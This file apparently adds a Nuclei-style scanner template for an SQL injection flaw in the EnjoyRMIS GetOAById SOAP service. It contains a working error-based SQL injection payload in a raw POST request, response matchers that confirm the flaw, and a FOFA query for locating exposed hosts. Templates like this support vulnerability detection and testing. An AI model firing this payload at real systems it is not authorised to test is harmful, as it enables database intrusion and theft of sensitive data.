@@ -1,0 +1,41 @@
+id: enjoyrmis-sqli
+
+info:
+  name: EnjoyRMIS - SQL Injection
+  author: s4e-io
+  severity: high
+  description: |
+    EnjoyRMIS GetOAById has a SQL injection vulnerability, through which an attacker can obtain sensitive database information and even control the server.
+  reference:
+    - https://github.com/wy876/POC/blob/main/EnjoyRMIS-GetOAById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: body="CheckSilverlightInstalled"
+    verified: true
+    max-request: 1
+  tags: enjoyrmis,sqli,vuln
+
+http:
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetOAById"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetOAById xmlns="http://tempuri.org/">
+              <sId>string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>
+            </GetOAById>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body,"qqqzq1qvkqq")'
+          - 'contains(header,"text/xml")'
+          - "status_code == 500"
+        condition: and
+# digest: 4b0a00483046022100be2db82433cabaa84f0eaa6d21d3e97d5fd60f4268b5c5a89b7f308d84759987022100d7fa857a575d48b1f9c447f40398c17ff89a69ed1dfec55487880b2d029c2a8d:922c64590222798bb761d5b6d8e72950
